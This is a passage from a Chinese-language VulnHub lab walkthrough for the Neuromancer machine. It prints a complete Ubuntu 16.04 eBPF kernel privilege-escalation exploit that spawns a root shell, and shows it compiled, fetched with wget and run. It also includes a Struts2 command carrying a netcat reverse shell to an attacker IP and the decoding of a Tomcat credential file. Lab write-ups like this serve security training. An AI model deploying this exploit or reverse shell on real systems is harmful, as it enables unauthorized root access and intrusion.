class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat 44298.c </span></span><br><span class="line">/*</span><br><span class="line"> * Ubuntu 16.04.4 kernel priv esc</span><br><span class="line"> *</span><br><span class="line"> * all credits to @bleidl</span><br><span class="line"> * - vnik</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// Tested on:</span><br><span class="line">// 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line">// <span class="keyword">if</span> different kernel adjust CRED offset + check kernel stack size</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;errno.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/bpf.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/un.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="comment">#define CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="comment">#define UID_OFFSET 4</span></span><br><span class="line"><span class="comment">#define LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="comment">#define PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line">int sockets[2];</span><br><span class="line">int mapfd, progfd;</span><br><span class="line"></span><br><span class="line">char *__prog =  <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">char bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">static int bpf_prog_load(enum bpf_prog_type prog_type,</span><br><span class="line">                  const struct bpf_insn *insns, int prog_len,</span><br><span class="line">                  const char *license, int kern_version) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .prog_type = prog_type,</span><br><span class="line">                .insns = (__u64)insns,</span><br><span class="line">                .insn_cnt = prog_len / sizeof(struct bpf_insn),</span><br><span class="line">                .license = (__u64)license,</span><br><span class="line">                .log_buf = (__u64)bpf_log_buf,</span><br><span class="line">                .log_size = LOG_BUF_SIZE,</span><br><span class="line">                .log_level = 1,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">        bpf_log_buf[0] = 0;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,</span><br><span class="line">                   int max_entries) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_type = map_type,</span><br><span class="line">                .key_size = key_size,</span><br><span class="line">                .value_size = value_size,</span><br><span class="line">                .max_entries = max_entries</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_update_elem(uint64_t key, uint64_t value) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_fd = mapfd,</span><br><span class="line">                .key = (__u64)&amp;key,</span><br><span class="line">                .value = (__u64)&amp;value,</span><br><span class="line">                .flags = 0,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_lookup_elem(void *key, void *value) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_fd = mapfd,</span><br><span class="line">                .key = (__u64)key,</span><br><span class="line">                .value = (__u64)value,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit(char *err) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void prep(void) &#123;</span><br><span class="line">        mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);</span><br><span class="line">        <span class="keyword">if</span> (mapfd &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">                        (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, 0);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (progfd &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void writemsg(void) &#123;</span><br><span class="line">        char buffer[64];</span><br><span class="line"></span><br><span class="line">        ssize_t n = write(sockets[0], buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n &lt; 0) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">                <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n != sizeof(buffer))</span><br><span class="line">                fprintf(stderr, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define __update_elem(a, b, c) \</span></span><br><span class="line">        bpf_update_elem(0, (a)); \</span><br><span class="line">        bpf_update_elem(1, (b)); \</span><br><span class="line">        bpf_update_elem(2, (c)); \</span><br><span class="line">        writemsg();</span><br><span class="line"></span><br><span class="line">static uint64_t get_value(int key) &#123;</span><br><span class="line">        uint64_t value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __get_fp(void) &#123;</span><br><span class="line">        __update_elem(1, 0, 0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> get_value(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __read(uint64_t addr) &#123;</span><br><span class="line">        __update_elem(0, addr, 0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> get_value(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __write(uint64_t addr, uint64_t val) &#123;</span><br><span class="line">        __update_elem(2, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t get_sp(uint64_t addr) &#123;</span><br><span class="line">        <span class="built_in">return</span> addr &amp; ~(0x4000 - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void pwn(void) &#123;</span><br><span class="line">        uint64_t fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">        fp = __get_fp();</span><br><span class="line">        <span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sp = get_sp(fp);</span><br><span class="line">        <span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">        credptr = __read(task_struct + CRED_OFFSET); // cred</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uidptr = credptr + UID_OFFSET; // uid</span><br><span class="line">        <span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">        __write(uidptr, 0); // <span class="built_in">set</span> both uid and gid to 0</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getuid() == 0) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">        prep();</span><br><span class="line">        pwn();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用下面的sed命令将c源文件的格式和缩进转换一下，以更好地编译exp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sed -i -e &#x27;s/\r$//&#x27; 44298.c</span></span><br></pre></td></tr></table></figure>

<p>然后编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gcc 44298.c -o 44298</span></span><br></pre></td></tr></table></figure>

<p>最后下载到目标机上，赋予权限之后运行exp程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ wget http://192.168.56.102:8000/44298</span><br><span class="line">--2020-01-15 23:44:14--  http://192.168.56.102:8000/44298</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17888 (17K) [application/octet-stream]</span><br><span class="line">Saving to: ‘44298’</span><br><span class="line"></span><br><span class="line">44298                              100%[=============================================================&gt;]  17.47K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-15 23:44:14 (482 MB/s) - ‘44298’ saved [17888/17888]</span><br><span class="line"></span><br><span class="line">lady3jane@neuromancer:~$ <span class="built_in">chmod</span> 777 *</span><br><span class="line">lady3jane@neuromancer:~$ ./44298</span><br><span class="line">task_struct = ffff88003cc93800</span><br><span class="line">uidptr = ffff88003579fd84</span><br><span class="line">spawning root shell</span><br><span class="line">root@neuromancer:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1001(lady3jane)</span><br><span class="line">root@neuromancer:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功获取root权限，下面寻找flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@neuromancer:~<span class="comment"># cd /root</span></span><br><span class="line">root@neuromancer:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt  struts2  velocity.log</span><br><span class="line">root@neuromancer:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">be3306f431dae5ebc93eebb291f4914a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub166.jpg"></p>
<p>不要太帅。。。</p>
<p>做一些成功利用后的枚举，发现确实有一个crontab配置为root来执行lady3jane的主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@neuromancer:/root<span class="comment"># crontab -l</span></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.                                                                                   </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line                                                                               </span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run                                                                             </span></span><br><span class="line"><span class="comment"># and what command to run for the task                                                                                                   </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for                                                                                 </span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),                                                                                 </span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).#                                                                         </span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system                                                                           </span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.                                                                                                 </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through                                                                          </span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line"></span><br><span class="line">*/3 * * * * /bin/bash /home/lady3jane/server-check.sh</span><br></pre></td></tr></table></figure>

<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>前面的通过Wintermute-Straylight这台虚拟机来探测内网主机的步骤省略</p>
<p>反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f&quot;</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] CMD: <span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f</span><br><span class="line">EXCEPTION::::--&gt; HTTPConnectionPool(host=<span class="string">&#x27;192.168.56.110&#x27;</span>, port=8080): Read timed out. (<span class="built_in">read</span> <span class="built_in">timeout</span>=3)</span><br><span class="line">ERROR</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.110: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 53960</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到“ta”似乎是管理员，但如果没有TTY会话，它将毫无用处：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">groups</span></span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>由于我们不在TTY终端中，因此看不到sudo -l的输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">sudo: no <span class="built_in">tty</span> present and no askpass program specified</span><br></pre></td></tr></table></figure>

<p>让我们看看是否已安装python，以便我们可以执行“pty”技巧<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzM3">Spawning a TTY Shell<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>

<p>不 …。不在那里。如果有admin privs，可以安装它。所以在这里对我们没有太大用处：</p>
<h2 id="步骤1：需要适当的TTY会话"><a href="#步骤1：需要适当的TTY会话" class="headerlink" title="步骤1：需要适当的TTY会话"></a>步骤1：需要适当的TTY会话</h2><p>没有适当的TTY session，将无法真正取得很大成就。有两种选择</p>
<ul>
<li>使用socat将reverse shell发送回Kali。Socat为此非常方便。请参阅本文前面的链接</li>
<li>可以使用ta帐户通过SSH进入邮箱吗？没有密码，但是也许可以生成一组ssh密钥。插入box中的能力取决于打开的端口（在34483上是…，并且已经有正确的端口转发功能）。另外，在&#x2F;etc&#x2F;passwd中为该帐户定义了什么？它需要包括某种shell程序设置。</li>
<li>寻找其他东西。在检查&#x2F;etc&#x2F;passwd以确定存在哪种类型的“ta”shell时，引用了：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lady3jane:x:1001:1001:3Jane,,,:/home/lady3jane:/bin/bash</span><br></pre></td></tr></table></figure>

<p>root后，已经在“Straylight”中的“note.txt”文件中看到了前面提到的内容。所以……也许那个盒子上的信条四处张望。想到这一点，介意在包装盒上其他地方也找到一些“ ta”的登录凭证。一个可能的查询行是Tomcat…它在xml文件中指定用户，该文件用于管理Tomcat工具。</p>
<p>让我们先尝试后一种方法。</p>
<h2 id="步骤2：获得TTY-重用的证书选项"><a href="#步骤2：获得TTY-重用的证书选项" class="headerlink" title="步骤2：获得TTY-重用的证书选项"></a>步骤2：获得TTY-重用的证书选项</h2><p>Tomcat用户是在tomcat-users.xml中定义的，因此查看这个文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /usr/local/tomcat/conf/tomcat-users.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Eng.,</span><br><span class="line"></span><br><span class="line">Tomcat is still using basic auth. I encoded the password so the AI<span class="string">&#x27;s security scans don&#x27;</span>t flag it.</span><br><span class="line"></span><br><span class="line">Is this what Bob keeps talking about, <span class="string">&quot;Security by obscurity?&quot;</span></span><br><span class="line"></span><br><span class="line">Ed Occam//Sys.Engineer I//Night City</span><br><span class="line"><span class="string">&quot;Harry, I took care of it&quot;</span> - Llyod Christmas</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;Lady3Jane&quot;</span> password=<span class="string">&quot;&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<p>因此看来密码已被编码。将其纳入Burp，并在解码（HTML）时得到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;!Xx3JanexX!&lt;</span><br></pre></td></tr></table></figure>

<p>lady3jane&#x2F;&gt;!Xx3JanexX!&lt;</p>
<p>ssh连接neuromancer：</p>
